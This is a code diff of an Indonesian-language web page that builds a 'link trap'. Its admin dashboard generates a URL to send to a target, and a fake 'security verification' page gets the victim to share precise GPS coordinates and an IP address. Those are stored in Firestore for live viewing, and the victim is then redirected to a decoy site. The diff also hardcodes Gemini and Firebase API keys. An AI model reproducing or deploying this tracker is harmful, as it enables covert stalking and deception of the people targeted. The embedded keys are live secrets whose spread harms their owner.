@@ -14,14 +14,11 @@
         .terminal { background: #000; border-left: 3px solid var(--neon-green); padding: 10px; font-size: 11px; height: 400px; overflow-y: auto; }
         .tab-btn { transition: 0.3s; border-bottom: 2px solid transparent; cursor: pointer; }
         .tab-btn.active { border-color: var(--neon-red); color: white; background: rgba(255,0,0,0.1); }
-        .loader { width: 14px; height: 14px; border: 2px solid var(--neon-green); border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body class="p-2 md:p-6">
 
     <div id="app-root" class="max-w-6xl mx-auto">
-        
         <!-- UI: DASHBOARD (ADMIN) -->
         <div id="admin-panel" class="space-y-4">
             <header class="flex flex-col md:flex-row justify-between items-center gap-4 mb-6">
@@ -41,10 +38,10 @@
                     <button onclick="switchTab('gen')" id="btn-gen" class="tab-btn w-full text-left p-3 glass rounded text-xs">🔗 LINK GENERATOR</button>
                     <button onclick="switchTab('ai')" id="btn-ai" class="tab-btn w-full text-left p-3 glass rounded text-xs">🤖 TACTICAL AI</button>
                     <div class="p-4 mt-4 glass rounded text-[9px] text-gray-600">
-                        <p class="font-bold text-gray-400 mb-1 uppercase">Cara Pakai:</p>
-                        1. Generate link trap.<br>
-                        2. Kirim ke target.<br>
-                        3. Pantau koordinat secara live.
+                        <p class="font-bold text-gray-400 mb-1 uppercase">Instruksi:</p>
+                        1. Bagikan link trap ke target.<br>
+                        2. Tunggu target melakukan verifikasi.<br>
+                        3. Data akan muncul di monitor.
                     </div>
                 </nav>
 
@@ -52,7 +49,7 @@
                     <div id="tab-monitor" class="tab-pane">
                         <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Target Feed</h2>
                         <div id="feed-container" class="terminal space-y-4 text-green-500">
-                            <div class="text-gray-700 italic">Menunggu autentikasi sistem...</div>
+                            <div class="text-gray-700 italic">Mencoba menghubungkan ke server...</div>
                         </div>
                     </div>
 
@@ -60,27 +57,24 @@
                         <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Deployment</h2>
                         <div class="space-y-4">
                             <div class="p-4 bg-red-900/10 border border-red-900/30 rounded">
-                                <label class="text-[10px] text-red-500 font-bold block mb-2">TARGET REDIRECT (e.g. YouTube/News)</label>
-                                <input type="text" id="redirect-input" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ" class="w-full bg-black border border-gray-800 p-2 text-xs outline-none text-white">
+                                <label class="text-[10px] text-red-500 font-bold block mb-2">TARGET REDIRECT</label>
+                                <input type="text" id="redirect-input" value="https://www.google.com" class="w-full bg-black border border-gray-800 p-2 text-xs outline-none text-white">
                             </div>
                             <div class="p-4 glass rounded">
-                                <label class="text-[10px] text-gray-500 block mb-2">TRAP URL (Bagikan link ini):</label>
+                                <label class="text-[10px] text-gray-500 block mb-2">TRAP URL:</label>
                                 <div class="flex gap-2">
                                     <input type="text" id="trap-url" readonly class="flex-1 bg-transparent text-blue-400 text-xs outline-none">
                                     <button onclick="copyTrapLink()" class="bg-blue-600 text-white px-4 py-1 rounded text-[10px]">COPY</button>
                                 </div>
                             </div>
-                            <button onclick="openTrapManual()" class="w-full border border-gray-700 py-3 rounded text-[10px] hover:bg-white/5">UJI COBA HALAMAN TRAP DI PERANGKAT INI</button>
                         </div>
                     </div>
 
                     <div id="tab-ai" class="tab-pane hidden flex flex-col h-[450px]">
                         <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Mazki Intel AI</h2>
-                        <div id="ai-chat" class="terminal flex-1 mb-4 text-green-400">
-                            <div class="text-green-800">[LOG]: AI System Standby.</div>
-                        </div>
+                        <div id="ai-chat" class="terminal flex-1 mb-4 text-green-400"></div>
                         <div class="flex gap-2">
-                            <input type="text" id="ai-input" placeholder="Analisis data target..." class="flex-1 bg-black border border-gray-800 p-3 text-xs text-white">
+                            <input type="text" id="ai-input" placeholder="Tanya AI..." class="flex-1 bg-black border border-gray-800 p-3 text-xs text-white">
                             <button onclick="askAI()" class="bg-green-600 text-black px-6 font-bold text-xs">KIRIM</button>
                         </div>
                     </div>
@@ -93,188 +87,158 @@
             <div class="max-w-sm">
                 <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
                 <h1 class="text-2xl font-bold text-gray-800 mb-2">Verifikasi Keamanan</h1>
-                <p class="text-gray-600 text-sm mb-6">Kami mendeteksi aktivitas mencurigakan. Selesaikan verifikasi GPS untuk melanjutkan ke konten yang diminta.</p>
+                <p class="text-gray-600 text-sm mb-6">Selesaikan verifikasi GPS untuk melanjutkan.</p>
                 <button id="btn-verify" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-lg shadow-lg active:scale-95 transition">VERIFIKASI SEKARANG</button>
-                <p class="text-[10px] text-gray-400 mt-8">Secure Powered by Google Identity Services</p>
             </div>
         </div>
     </div>
 
-    <!-- FIREBASE & LOGIC -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
         import { getFirestore, collection, addDoc, onSnapshot, query, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        // Konfigurasi Dasar
-        let firebaseConfig = {};
-        try {
-            firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {};
-        } catch(e) { console.error("Firebase Config Error", e); }
+        // ==========================================
+        // 1. GOOGLE GEMINI API KEY (DIISI OTOMATIS)
+        // ==========================================
+        const apiKey = "AIzaSyDINRKcVKNFIrxWUoyeSg9R03IYCHGR_DU"; // <--- API KEY DIMASUKKAN DI SINI
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const auth = getAuth(app);
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'mazki-fs';
-        
-        let currentUser = null;
-        let unsubscribeMonitor = null;
+        // Global State
+        let db, auth, currentUser;
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'mazki-fs-v1';
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const isTrapMode = urlParams.get('view') === 'trap';
+        // Inisialisasi Firebase
+        async function startSystem() {
+            try {
+                // ==========================================
+                // 2. KONFIGURASI FIREBASE ANDA
+                // Pastikan nilai-nilai di bawah ini sesuai dengan Firebase Console Anda
+                // ==========================================
+                let firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {
+                    apiKey: "AIzaSyC8XeElXIoVdYMCFH16nXnE8q92RvuOOtM",
+  authDomain: "mazkiplaycheck.firebaseapp.com",
+  projectId: "mazkiplaycheck",
+  storageBucket: "mazkiplaycheck.firebasestorage.app",
+  messagingSenderId: "662285872996",
+  appId: "1:662285872996:web:9249e209bda07e52b95471",
+  measurementId: "G-JKVSV73K3E"
+                }; // <--- KONFIGURASI FIREBASE ANDA
 
-        // --- EXPORT KE GLOBAL AGAR BISA DIKLIK (SOLUSI MASALAH KLIK) ---
+                if (!firebaseConfig || !firebaseConfig.apiKey) {
+                    throw new Error("Konfigurasi Firebase belum lengkap.");
+                }
+
+                const app = initializeApp(firebaseConfig);
+                db = getFirestore(app);
+                auth = getAuth(app);
+
+                onAuthStateChanged(auth, (user) => {
+                    if (user) {
+                        currentUser = user;
+                        updateStatus("ONLINE", "text-green-500 font-bold");
+                        
+                        const urlParams = new URLSearchParams(window.location.search);
+                        if (urlParams.get('view') === 'trap') {
+                            showTrapUI();
+                        } else {
+                            initAdminDashboard();
+                        }
+                    } else {
+                        updateStatus("OFFLINE", "text-gray-500");
+                        signIn();
+                    }
+                });
+            } catch (e) {
+                console.error("Init Error:", e);
+                updateStatus("CONFIG ERROR", "text-red-500 font-bold");
+            }
+        }
+
+        async function signIn() {
+            try {
+                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                    await signInWithCustomToken(auth, __initial_auth_token);
+                } else {
+                    await signInAnonymously(auth);
+                }
+            } catch (err) {
+                console.error("Auth failed:", err);
+                updateStatus("AUTH ERROR", "text-red-500 font-bold");
+            }
+        }
+
+        function updateStatus(text, className) {
+            const el = document.getElementById('db-status');
+            if (el) {
+                el.innerText = text;
+                el.className = className;
+            }
+        }
+
         window.switchTab = (id) => {
             document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            const targetTab = document.getElementById('tab-' + id);
-            const targetBtn = document.getElementById('btn-' + id);
-            if(targetTab) targetTab.classList.remove('hidden');
-            if(targetBtn) targetBtn.classList.add('active');
+            document.getElementById('tab-' + id).classList.remove('hidden');
+            document.getElementById('btn-' + id).classList.add('active');
         };
 
         window.copyTrapLink = () => {
-            const copyText = document.getElementById("trap-url");
-            if (copyText) {
-                copyText.select();
-                document.execCommand("copy");
-                alert("Link Trap telah disalin ke clipboard!");
-            }
-        };
-
-        window.openTrapManual = () => {
-            const url = document.getElementById('trap-url').value;
-            window.open(url, '_blank');
+            const trapUrl = document.getElementById("trap-url");
+            trapUrl.select();
+            document.execCommand("copy");
+            alert("Link disalin!");
         };
 
         window.askAI = async () => {
             const input = document.getElementById('ai-input');
             const chat = document.getElementById('ai-chat');
-            const text = input.value.trim();
-            if(!text) return;
+            const prompt = input.value.trim();
+            if (!prompt) return;
 
-            chat.innerHTML += `<div class="text-white mt-2">USER> ${text}</div>`;
+            chat.innerHTML += `<div class="text-white mb-2">> ${prompt}</div>`;
             input.value = "";
-            chat.scrollTop = chat.scrollHeight;
-
-            const apiKey = ""; 
-            if(!apiKey) {
-                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] API_KEY_MISSING.</div>`;
-                return;
-            }
 
             try {
-                const resp = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
+                const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        contents: [{ parts: [{ text: text }] }],
-                        systemInstruction: { parts: [{ text: "Analisis koordinat sebagai pakar siber." }] }
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] })
                 });
-                const json = await resp.json();
-                const response = json.candidates?.[0]?.content?.parts?.[0]?.text || "No response";
-                chat.innerHTML += `<div class="text-green-500 mt-1">MAZKI> ${response}</div>`;
-            } catch(e) {
-                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] Uplink failed.</div>`;
+                const data = await res.json();
+                const reply = data.candidates[0].content.parts[0].text;
+                chat.innerHTML += `<div class="text-green-400 mb-4">AI: ${reply}</div>`;
+            } catch (e) {
+                chat.innerHTML += `<div class="text-red-500">AI Error: Periksa koneksi atau API Key.</div>`;
             }
             chat.scrollTop = chat.scrollHeight;
         };
 
-        // --- AUTH & DB LOGIC ---
-        const initAuth = async (retries = 5) => {
-            for (let i = 0; i < retries; i++) {
-                try {
-                    if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                        await signInWithCustomToken(auth, __initial_auth_token);
-                    } else {
-                        await signInAnonymously(auth);
-                    }
-                    return; // Berhasil
-                } catch (err) {
-                    if (i === retries - 1) {
-                        document.getElementById('db-status').innerText = "AUTH ERROR";
-                        console.error("Auth failed after retries", err);
-                    }
-                    await new Promise(r => setTimeout(r, 1000 * Math.pow(2, i))); // Exponential backoff
-                }
-            }
-        };
-
-        initAuth();
-
-        onAuthStateChanged(auth, (user) => {
-            if (user) {
-                currentUser = user;
-                const statusEl = document.getElementById('db-status');
-                if(statusEl) {
-                    statusEl.innerText = "ONLINE";
-                    statusEl.className = "text-green-500 font-bold";
-                }
-                
-                if (isTrapMode) {
-                    showTrapUI();
-                } else {
-                    initAdminDashboard();
-                }
-            } else {
-                document.getElementById('db-status').innerText = "OFFLINE";
-            }
-        });
-
         function initAdminDashboard() {
-            const currentUrl = window.location.href.split('?')[0];
-            const trapInput = document.getElementById('trap-url');
-            if(trapInput) trapInput.value = `${currentUrl}?view=trap`;
-            
-            // Path sesuai Rule Firestore
-            const colPath = ['artifacts', appId, 'public', 'data', 'traps'];
-            const colRef = collection(db, ...colPath);
-            const q = query(colRef);
+            const baseUrl = window.location.href.split('?')[0];
+            document.getElementById('trap-url').value = `${baseUrl}?view=trap`;
 
-            if (unsubscribeMonitor) unsubscribeMonitor();
-
-            unsubscribeMonitor = onSnapshot(q, (snapshot) => {
+            const colRef = collection(db, 'artifacts', appId, 'public', 'data', 'traps');
+            onSnapshot(query(colRef), (snapshot) => {
                 const feed = document.getElementById('feed-container');
                 const count = document.getElementById('target-count');
-                if(count) count.innerText = snapshot.docs.length;
+                count.innerText = snapshot.docs.length;
 
                 if (snapshot.empty) {
-                    if(feed) feed.innerHTML = `<div class="text-gray-700 italic">Menunggu target masuk...</div>`;
+                    feed.innerHTML = `<div class="text-gray-700 italic">Belum ada data target.</div>`;
                     return;
                 }
 
-                // Sort manual (memory) untuk menghindari index error
-                const dataList = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
-                dataList.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
-
-                if(feed) {
-                    feed.innerHTML = "";
-                    dataList.forEach(data => {
-                        const date = data.timestamp?.toDate().toLocaleString() || "Syncing...";
-                        const el = document.createElement('div');
-                        el.className = "p-3 border-b border-gray-900 hover:bg-white/5 transition mb-2 glass rounded";
-                        el.innerHTML = `
-                            <div class="flex justify-between items-start mb-1">
-                                <span class="text-red-500 font-bold text-[10px]">[!] TARGET_ACQUIRED</span>
-                                <span class="text-gray-600 text-[9px]">${date}</span>
-                            </div>
-                            <div class="grid grid-cols-2 text-[10px] gap-2">
-                                <div><span class="text-gray-500">IP:</span> ${data.ip || 'N/A'}</div>
-                                <div><span class="text-gray-500">ACC:</span> ${data.accuracy ? data.accuracy.toFixed(1) + 'm' : 'N/A'}</div>
-                                <div class="col-span-2 mt-1">
-                                    <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" 
-                                       class="bg-blue-900/30 text-blue-400 px-2 py-1 rounded inline-block border border-blue-900">
-                                       VIEW ON MAPS →
-                                    </a>
-                                </div>
-                            </div>
-                        `;
-                        feed.appendChild(el);
-                    });
-                }
+                const sorted = snapshot.docs.map(d => d.data()).sort((a,b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
+                feed.innerHTML = sorted.map(data => `
+                    <div class="p-3 border-b border-gray-900 mb-2 glass">
+                        <p class="text-red-500 font-bold text-[10px] uppercase">[!] Target Found</p>
+                        <p class="text-[10px]">IP: ${data.ip || 'Unknown'}</p>
+                        <p class="text-[10px]">Loc: <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="text-blue-400 underline">Maps</a></p>
+                        <p class="text-[8px] text-gray-500">${data.timestamp?.toDate().toLocaleString() || ''}</p>
+                    </div>
+                `).join('');
             }, (error) => {
-                console.error("Monitor Error:", error);
+                console.error("Snapshot error:", error);
             });
         }
 
@@ -283,43 +247,24 @@
             document.getElementById('trap-page').classList.remove('hidden');
             document.body.style.backgroundColor = "white";
 
-            const btnVerify = document.getElementById('btn-verify');
-            if(btnVerify) {
-                btnVerify.onclick = () => {
-                    if (!currentUser) {
-                        alert("Sistem belum siap. Tunggu status DB ONLINE.");
-                        return;
-                    }
-
-                    if ("geolocation" in navigator) {
-                        navigator.geolocation.getCurrentPosition(async (pos) => {
-                            let ip = "Checking...";
-                            try { 
-                                const res = await fetch('https://api.ipify.org?format=json');
-                                const json = await res.json();
-                                ip = json.ip;
-                            } catch(e) {}
-
-                            try {
-                                const colPath = ['artifacts', appId, 'public', 'data', 'traps'];
-                                await addDoc(collection(db, ...colPath), {
-                                    lat: pos.coords.latitude,
-                                    lon: pos.coords.longitude,
-                                    accuracy: pos.coords.accuracy,
-                                    ip: ip,
-                                    ua: navigator.userAgent,
-                                    timestamp: serverTimestamp()
-                                });
-                                const redirect = document.getElementById('redirect-input').value || "https://www.google.com";
-                                window.location.href = redirect;
-                            } catch (err) { console.error(err); }
-                        }, (err) => {
-                            alert("Izin lokasi diperlukan untuk verifikasi keamanan.");
-                        }, { enableHighAccuracy: true });
-                    }
-                };
-            }
+            document.getElementById('btn-verify').onclick = () => {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    let ip = "N/A";
+                    try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e) {}
+                    
+                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'traps'), {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        ip: ip,
+                        timestamp: serverTimestamp()
+                    });
+                    window.location.href = document.getElementById('redirect-input').value;
+                }, () => alert("Izin GPS wajib diberikan untuk melanjutkan."), { enableHighAccuracy: true });
+            };
         }
+
+        startSystem();
     </script>
 </body>
 </html>
